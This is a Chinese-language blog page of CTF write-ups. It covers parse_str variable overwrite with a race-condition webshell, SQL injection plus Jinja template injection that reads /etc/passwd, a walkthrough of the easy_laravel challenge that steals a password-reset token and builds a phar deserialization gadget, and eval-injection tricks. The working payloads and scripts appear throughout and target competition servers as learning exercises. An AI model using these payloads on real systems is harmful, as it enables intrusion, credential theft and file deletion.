<p><img src="https://i.loli.net/2018/11/05/5be04829b8f27.png" alt="https://i.loli.net/2018/11/05/5be04829b8f27.png"></p>
<h3 id="babyWeb"><a href="#babyWeb" class="headerlink" title="babyWeb"></a>babyWeb</h3><p>加XFF头和更改cookie的admin</p>
<p><img src="https://i.loli.net/2018/11/05/5be0469b3c44a.png" alt="https://i.loli.net/2018/11/05/5be0469b3c44a.png"></p>
<h3 id="babyWeb2"><a href="#babyWeb2" class="headerlink" title="babyWeb2"></a>babyWeb2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span> <span class="string">'here.php'</span>;</span><br><span class="line">    $key = <span class="string">'kelaibei'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))&#123;</span><br><span class="line">        $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">        @parse_str($id);</span><br><span class="line">        <span class="keyword">if</span> ($key[<span class="number">99</span>] != <span class="string">'aabg7XSs'</span> &amp;&amp; md5($key[<span class="number">99</span>]) == md5(<span class="string">'aabg7XSs'</span>)) &#123;</span><br><span class="line">           <span class="keyword">echo</span> $hint;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'try again'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>利用parse_str变量覆盖，paylaod:<code>?id=key[99]=QNKCDZO</code></p>
<p>得到upl04d50m3thing.php</p>
<p><img src="https://i.loli.net/2018/11/05/5be0439d8caab.png" alt="https://i.loli.net/2018/11/05/5be0439d8caab.png"></p>
<p>写入一句话,提交得到php文件链接，访问发现内容被更改，输出<code>Too slow!</code></p>
<p>利用条件竞争，先用burp的intruder开多线程访问</p>
<p><img src="https://i.loli.net/2018/11/05/5be044231e4b6.png" alt="https://i.loli.net/2018/11/05/5be044231e4b6.png"></p>
<p>再利用脚本或其他方式尝试getshell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">u = <span class="string">'http://47.105.148.65:29002/uploads/8af92ffefda7050707590b352dfb3cd2e03d29a6/s.php'</span></span><br><span class="line">passwd = <span class="string">'s'</span></span><br><span class="line">com = <span class="string">'ls -a'</span></span><br><span class="line">payload = &#123;passwd:<span class="string">'system(\''</span>+com+<span class="string">'\');'</span>&#125;</span><br><span class="line">s = requests.Session()</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = s.post(u,payload)</span><br><span class="line">        print(<span class="string">"[+] success\n"</span>+res.text+<span class="string">"==="</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"failed"</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2018/11/05/5be044d1f3d51.png" alt="https://i.loli.net/2018/11/05/5be044d1f3d51.png"></p>
<h3 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h3><p>Search Comments:处存在sql注入</p>
<p><code>&#39; order by 4#</code> 出现错误</p>
<p><img src="https://i.loli.net/2018/11/06/5be104a33ad56.png" alt="https://i.loli.net/2018/11/06/5be104a33ad56.png"></p>
<p><code>http://47.105.148.65:29003/?username=&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema = &#39;ctf&#39; and table_name=&#39;comment&#39;),3%23</code></p>
<p>得到id,username,comment</p>
<p>但是只能在第三个字段查询，且<code>&#39; union select 1,2,comment from comment%23</code>会出现和<code>&#39; or 1=1%23</code>一样的<code>Rendering Error.</code></p>
<p>出现了模版渲染错误</p>
<p>直接<code>&#39; union select 1,2,10%23</code>测试报 Mysql Error.错误，应该是花括号原因，不过mysql支持0x开头的16进制，以16进制传入即可</p>
<p><img src="https://i.loli.net/2018/11/06/5be10acb1615d.png" alt="https://i.loli.net/2018/11/06/5be10acb1615d.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; ().__class__.__bases__[0].__subclasses__()[40](&quot;/etc/passwd&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>能够正常读取</p>
<p><img src="https://i.loli.net/2018/11/06/5be10d604faf8.png" alt="https://i.loli.net/2018/11/06/5be10d604faf8.png"></p>
<p>尝试查看flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; ().__class__.__bases__[0].__subclasses__()[40](&quot;/flag&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><code>flag{c15f43da-481e-4131-84b2-e315719b989b}</code></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2018/10/23/php-unserialize/">PHP反序列化漏洞</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2018-10-23</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/PHP反序列化/">PHP反序列化</a></span><div class="content"><p>补充了一些内容</p></div><a class="more" href="/2018/10/23/php-unserialize/#more">阅读更多</a><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2018/10/22/easy_Laravel/">护网杯之easy_Laravel</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2018-10-22</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/WriteUp/">WriteUp</a></span><div class="content"><a id="more"></a>
<blockquote>
<p>护网杯又被锤爆，其他题目没截图什么的，也没写wp，easy_laravel感觉并不easy，没做出来，既然github上有docker，就跟着wp学习一下</p>
</blockquote>
<p>通过<code>https://github.com/qqqqqqvq/easy_laravel</code>链接下载源码</p>
<p>看到composer.json, 说明可以进行<code>composer install</code>安装项目的依赖，如果存在composer.phar文件，可使用<code>php composer.phar install</code>安装</p>
<p><img src="https://i.loli.net/2018/10/20/5bcb0f4057373.png" alt="e4.png"></p>
<p>之后会出现一个vendor文件夹</p>
<p>首先查看路由，分析操作</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Route::get(&apos;/&apos;, function () &#123; return view(&apos;welcome&apos;); &#125;);</span><br><span class="line">Auth::routes();</span><br><span class="line">Route::get(&apos;/home&apos;, &apos;HomeController@index&apos;);</span><br><span class="line">Route::get(&apos;/note&apos;, &apos;NoteController@index&apos;)-&gt;name(&apos;note&apos;);</span><br><span class="line">Route::get(&apos;/upload&apos;, &apos;UploadController@index&apos;)-&gt;name(&apos;upload&apos;);</span><br><span class="line">Route::post(&apos;/upload&apos;, &apos;UploadController@upload&apos;)-&gt;name(&apos;upload&apos;);</span><br><span class="line">Route::get(&apos;/flag&apos;, &apos;FlagController@showFlag&apos;)-&gt;name(&apos;flag&apos;);</span><br><span class="line">Route::get(&apos;/files&apos;, &apos;UploadController@files&apos;)-&gt;name(&apos;files&apos;);</span><br><span class="line">Route::post(&apos;/check&apos;, &apos;UploadController@check&apos;)-&gt;name(&apos;check&apos;);</span><br><span class="line">Route::get(&apos;/error&apos;, &apos;HomeController@error&apos;)-&gt;name(&apos;error&apos;);</span><br></pre></td></tr></table></figure>
<p><code>Auth::routes()</code>路由是 Laravel 默认提供的一套关于用户系统的脚手架，能推测出开发的操作是<code>php artisan make:auth</code></p>
<p>非admin只能访问note页面</p>
<p>由注册控制器找到ModelFactory.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$factory-&gt;define(App\User::class, function (Faker\Generator $faker) &#123;</span><br><span class="line">    static $password;</span><br><span class="line"></span><br><span class="line">    return [</span><br><span class="line">        &apos;name&apos; =&gt; &apos;4uuu Nya&apos;,</span><br><span class="line">        &apos;email&apos; =&gt; &apos;admin@qvq.im&apos;,</span><br><span class="line">        &apos;password&apos; =&gt; bcrypt(str_random(40)),</span><br><span class="line">        &apos;remember_token&apos; =&gt; str_random(10),</span><br><span class="line">    ];</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>40位随机字符串作为admin密码，无法暴力破解</p>
<p>找到note页面的控制器</p>
<p><code>/app/Http/Controllers/NoteController.php</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public function index(Note $note)</span><br><span class="line">&#123;</span><br><span class="line">    $username = Auth::user()-&gt;name;</span><br><span class="line">    $notes = DB::select(&quot;SELECT * FROM `notes` WHERE `author`=&apos;&#123;$username&#125;&apos;&quot;);</span><br><span class="line">    return view(&apos;note&apos;, compact(&apos;notes&apos;));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中存在明显注入点，利用username</p>
<p>sql语句变为</p>
<p><code>SELECT * FROM `notes` WHERE `author`=&#39;admin&#39; or 1=1#&#39;</code></p>
<p>正常note页面无任何信息，登陆<code>admin&#39; or 1=1#</code>查看note页面</p>
<p>返回</p>
<p><code>nginx是坠吼的 ( 好麻烦，默认配置也是坠吼的</code></p>
<p>接着可以进行一些注入</p>
<p><code>&#39; union select 1,(group_concat(table_name) from information_schema.tables where table_schema=0x687762),3,4,5#</code></p>
<p><code>&#39; union select 1,(select token from password_resets),3,4,5#</code></p>
<p>然而admin的密码难以解密，既然知道邮箱，看能否重置密码</p>
<p>在/vendor/laravel/framework/src/Illuminate\Auth\Passwords\ PasswordBroker.php中发送重置链接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public function sendResetLink(array $credentials)</span><br><span class="line">&#123;</span><br><span class="line">    $user = $this-&gt;getUser($credentials);</span><br><span class="line"></span><br><span class="line">    if (is_null($user)) &#123;</span><br><span class="line">        return static::INVALID_USER;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $user-&gt;sendPasswordResetNotification(</span><br><span class="line">        $this-&gt;tokens-&gt;create($user)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    return static::RESET_LINK_SENT;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>相邻的DatabaseTokenRepository.php中生成一个新token，create方法中把token写入了数据库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public function create(CanResetPasswordContract $user)</span><br><span class="line">&#123;</span><br><span class="line">    $email = $user-&gt;getEmailForPasswordReset();</span><br><span class="line"></span><br><span class="line">    $this-&gt;deleteExisting($user);</span><br><span class="line"></span><br><span class="line">    $token = $this-&gt;createNewToken();</span><br><span class="line"></span><br><span class="line">    $this-&gt;getTable()-&gt;insert($this-&gt;getPayload($email, $token));</span><br><span class="line"></span><br><span class="line">    return $token;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public function createNewToken()</span><br><span class="line">&#123;</span><br><span class="line">    return hash_hmac(&apos;sha256&apos;, Str::random(40), $this-&gt;hashKey);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">protected function getPayload($email, $token)</span><br><span class="line">&#123;</span><br><span class="line">    return [&apos;email&apos; =&gt; $email, &apos;token&apos; =&gt; $token, &apos;created_at&apos; =&gt; new Carbon];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>高于5.4的版本中，重置密码这个 token 会被 bcrypt 再存入</p>
<p>从composer.json能看出laravel版本低于5.4</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;require&quot;: &#123;</span><br><span class="line">    &quot;php&quot;: &quot;&gt;=5.6.4&quot;,</span><br><span class="line">    &quot;laravel/framework&quot;: &quot;5.3.*&quot;,</span><br><span class="line">    &quot;laracasts/flash&quot;: &quot;^2.0&quot;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
<p>利用sql注入获取token</p>
<p>/database/migrations/2014_10_12_100000_create_password_resets_table.php中创建的password_resets表中含token</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public function up()</span><br><span class="line">&#123;</span><br><span class="line">    Schema::create(&apos;password_resets&apos;, function (Blueprint $table) &#123;</span><br><span class="line">        $table-&gt;string(&apos;email&apos;)-&gt;index();</span><br><span class="line">        $table-&gt;string(&apos;token&apos;)-&gt;index();</span><br><span class="line">        $table-&gt;timestamp(&apos;created_at&apos;)-&gt;nullable();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注入获得token</p>
<p><code>&#39; union select 1,(select token from password_resets limit 1,2),3,4,5#</code></p>
<p><img src="https://i.loli.net/2018/10/20/5bcb4a5315022.png" alt="e6.png"></p>
<p>访问<code>http://127.0.0.1:7777/password/reset/7c80f08e9cccfd8e149506b6c35223574eacfbe305b0c92ae8c7400fe1cd6f7b</code></p>
<p>登陆admin账号</p>
<p><img src="https://i.loli.net/2018/10/20/5bcb468b472d6.png" alt="e3.png"></p>
<p>按照FlagController.php的代码，应该是直接打印flag的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public function showFlag()</span><br><span class="line">&#123;</span><br><span class="line">    $flag = file_get_contents(&apos;/th1s1s_F14g_2333333&apos;);</span><br><span class="line">    return view(&apos;auth.flag&apos;)-&gt;with(&apos;flag&apos;, $flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是并得不到flag,页面提示 no flag</p>
<blockquote>
<p>这里页面内容不一致，在 laravel 中，模板文件是存放在 resources/views 中的，然后会被编译放到 storage/framework/views 中，而编译后的文件存在<strong>过期</strong>的判断</p>
</blockquote>
<p>即需要删除flag的模版缓存，同时在上传控制器中，path与filename参数完全可控</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">   public function files()</span><br><span class="line">    &#123;</span><br><span class="line">        $files = array_except(Storage::allFiles(&apos;public&apos;), [&apos;0&apos;]);</span><br><span class="line">        return view(&apos;files&apos;)-&gt;with(&apos;files&apos;, $files);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public function check(Request $request)</span><br><span class="line">    &#123;</span><br><span class="line">        $path = $request-&gt;input(&apos;path&apos;, $this-&gt;path);</span><br><span class="line">        $filename = $request-&gt;input(&apos;filename&apos;, null);</span><br><span class="line">        if($filename)&#123;</span><br><span class="line">            if(!file_exists($path . $filename))&#123;</span><br><span class="line">                Flash::error(&apos;磁盘文件已删除，刷新文件列表&apos;);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                Flash::success(&apos;文件有效&apos;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return redirect(route(&apos;files&apos;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>能通过file_exists使用phar://协议触发反序列化</p>
<blockquote>
<p><a href="https://xz.aliyun.com/t/2715#toc-14" target="_blank" rel="noopener">file_exist的使用</a></p>
</blockquote>
<p>这里需要知道phar协议在涉及到文件操作的时候存在反序列化，所以可以利用反序列化删除模板缓存，而admin可以上传文件</p>
<ul>
<li>利用 phar 拓展 php 反序列化漏洞攻击面<br>:<a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a></li>
</ul>
<ul>
<li><p>魔术方法：<code>__destruct</code></p>
<ul>
<li>销毁对象的时候会自动调用该方法</li>
</ul>
</li>
</ul>
<p>全局搜索<code>__destruct</code></p>
<p><img src="https://i.loli.net/2018/10/21/5bcc8aac0ee51.png" alt="e7.png"></p>
<p>找到一个unlink函数用来删除文件</p>
<p>是个位于TemporaryFileByteStream.php中的类</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">class Swift_ByteStream_TemporaryFileByteStream extends Swift_ByteStream_FileByteStream</span><br><span class="line">&#123;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $filePath = tempnam(sys_get_temp_dir(), &apos;FileByteStream&apos;);</span><br><span class="line"></span><br><span class="line">        if ($filePath === false) &#123;</span><br><span class="line">            throw new Swift_IoException(&apos;Failed to retrieve temporary file name.&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        parent::__construct($filePath, true);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getContent()</span><br><span class="line">    &#123;</span><br><span class="line">        if (($content = file_get_contents($this-&gt;getPath())) === false) &#123;</span><br><span class="line">            throw new Swift_IoException(&apos;Failed to get temporary file content.&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return $content;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        if (file_exists($this-&gt;getPath())) &#123;</span><br><span class="line">            @unlink($this-&gt;getPath());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>现在要找到缓存文件，<code>/usr/share/nginx/html</code>是nginx默认路径，模板文件在<code>resources/views/</code>里，接着本地在auth文件夹里看到一个flag.blade.php</p>
<p>在Illuminate/View/Compilers/Compiler.php中得知缓存文件名为模版文件路径的sha1，即34e41df0934a75437873264cd28e2d835bc38772.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function getCompiledPath($path)</span><br><span class="line">&#123;</span><br><span class="line">    return $this-&gt;cachePath.&apos;/&apos;.sha1($path).&apos;.php&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接着生成供反序列化的phar文件</p>
<p>参考了好几个大佬的payload，根据本地文件修改了下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    include(&apos;vendor/autoload.php&apos;);</span><br><span class="line">    $a = serialize(new Swift_ByteStream_TemporaryFileByteStream());</span><br><span class="line">    //var_dump(unserialize($a));</span><br><span class="line">    //var_dump($a);</span><br><span class="line">    $a = preg_replace(&quot;/\/private\/var\/folders\/v4\/wl2fggss4x76q3_m97bjsw780000gn\/T\/FileByteStream[a-zA-Z0-9]&#123;6&#125;/&quot;,&quot;/usr/share/nginx/html/storage/framework/views/34e41df0934a75437873264cd28e2d835bc38772.php&quot;, $a);</span><br><span class="line">    var_dump($a);</span><br><span class="line">    $a = str_replace(&apos;s:77&apos;, &apos;s:90&apos;, $a);</span><br><span class="line">    $b = unserialize($a);</span><br><span class="line">    $p = new Phar(&apos;./3.phar&apos;, 0);</span><br><span class="line">    $p-&gt;startBuffering();</span><br><span class="line">    $p-&gt;setStub(&apos;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&apos;);</span><br><span class="line">    $p-&gt;setMetadata($b);</span><br><span class="line">    $p-&gt;addFromString(&apos;test.txt&apos;,&apos;text&apos;);</span><br><span class="line">    $p-&gt;stopBuffering();</span><br><span class="line">    rename(&apos;3.phar&apos;, &apos;3.gif&apos;)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><strong>注：php.ini中的phar.readonly项设置为Off或0才能生成phar文件</strong></p>
<p>生成phar文件后改图片后缀上传，抓包传入path和filename</p>
<p><img src="https://i.loli.net/2018/10/22/5bcdebb43792e.png" alt="e9.png"></p>
<p>访问flag即可</p>
<p><img src="https://i.loli.net/2018/10/22/5bcdebb445713.png" alt="e8.png"></p>
<p>参考：</p>
<p>出题人题解：<br><a href="https://qvq.im/post/%E6%8A%A4%E7%BD%91%E6%9D%AF2018%20easy_laravel%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95" target="_blank" rel="noopener">https://qvq.im/post/%E6%8A%A4%E7%BD%91%E6%9D%AF2018%20easy_laravel%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95</a></p>
<p><a href="https://xz.aliyun.com/t/2901" target="_blank" rel="noopener">https://xz.aliyun.com/t/2901</a></p>
<p><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a></p>
<p><a href="http://p0desta.com/2018/10/15/%E6%8A%A4%E7%BD%91%E6%9D%AFeasy_laravel&amp;pwnhub%E5%92%95%E5%92%95%E5%95%86%E5%BA%97/" target="_blank" rel="noopener">http://p0desta.com/2018/10/15/%E6%8A%A4%E7%BD%91%E6%9D%AFeasy_laravel&amp;pwnhub%E5%92%95%E5%92%95%E5%95%86%E5%BA%97/</a></p>
<p><a href="https://xz.aliyun.com/t/2715#toc-14" target="_blank" rel="noopener">https://xz.aliyun.com/t/2715#toc-14</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2018/10/16/Hackergame_2018/">Hackergame 2018 (中国科学技术大学第五届信息安全大赛) WriteUp</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2018-10-16</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/WriteUp/">WriteUp</a></span><div class="content"><p>前两题不写了。。</p></div><a class="more" href="/2018/10/16/Hackergame_2018/#more">阅读更多</a><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2018/09/26/ctfs_18_9/">部分 noxCTF &amp; hackitctf WriteUp</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2018-09-26</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/WriteUp/">WriteUp</a></span><div class="content"><a id="more"></a>
<h1 id="123"><a href="#123" class="headerlink" title="123"></a>123</h1><p>源码提示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 用户信息都在user.php里 --&gt;</span><br><span class="line">&lt;!-- 用户默认默认密码为用户名+出生日期 例如:zhangwei1999 --&gt;</span><br></pre></td></tr></table></figure>
<p>user.php空白，user.php.bak内容含很多用户名，可用来爆破，扫描得到的flag.php并没有flag</p>
<p>选burp的attack type为pitchfork，set两个payload爆破<br>得到用户和密码</p>
<p><img src="https://i.loli.net/2018/09/02/5b8bacfc8afb6.png" alt="ks1.png"></p>
<p>源码提示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 存在漏洞需要去掉  --&gt;</span><br><span class="line">&lt;!-- &lt;form action=&quot;&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">	&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">	&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;上传&quot; /&gt;</span><br><span class="line">&lt;/form&gt; --&gt;</span><br></pre></td></tr></table></figure>
<p>去掉注释，补上action，上传文件</p>
<p>phmtl后缀绕过</p>
<p>得到：<br><code>&lt;a href=&quot;/view.php&quot;&gt;view&lt;/a&gt;</code></p>
<p>view.php提示file，传入file参数又提示filter “flag”，过滤了flag</p>
<p>双写绕过</p>
<p><code>http://9df2aa756fb048e7b0df80c187e5d350b037754437604bc6.game.ichunqiu.com/view.php?file=flflagag</code></p>
<p><code>flag{d0b2de22-fe4d-48ee-a447-f010dc83c087}</code></p>
<h1 id="https-shrimphp-herokuapp-com-F0-9F-8D-A4-22-system-ls-22"><a href="#https-shrimphp-herokuapp-com-F0-9F-8D-A4-22-system-ls-22" class="headerlink" title="https://shrimphp.herokuapp.com/?%F0%9F%8D%A4=%22.system(ls).%22"></a><a href="https://shrimphp.herokuapp.com/?%F0%9F%8D%A4=%22.system(ls).%22" target="_blank" rel="noopener">https://shrimphp.herokuapp.com/?%F0%9F%8D%A4=%22.system(ls).%22</a></h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// flag&#123;thisisnotflag&#125;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$_ = $_GET[&apos;🍤&apos;];</span><br><span class="line">//$_ = &apos;&quot;.system(ls).&quot;&apos;;</span><br><span class="line">if( strpos($_, &apos;&quot;&apos;) || strpos($_, &quot;&apos;&quot;) || strpos($_, &quot;_&quot;) || strpos($_, &quot;[&quot;) || strpos($_, &quot;$&quot;) ) </span><br><span class="line">    die(&apos;What did you do?????&apos;);</span><br><span class="line"></span><br><span class="line">eval(&apos;die(&quot;&apos; . substr($_, 0, 16) . &apos;&quot;);&apos;);</span><br><span class="line">echo &apos;Try harder!!!!&apos;;</span><br></pre></td></tr></table></figure>
<p><code>?🍤=&quot;.system(ls).&quot;</code></p>
<p><code>flag{php_is_good_for_hackers!!!!}</code></p>
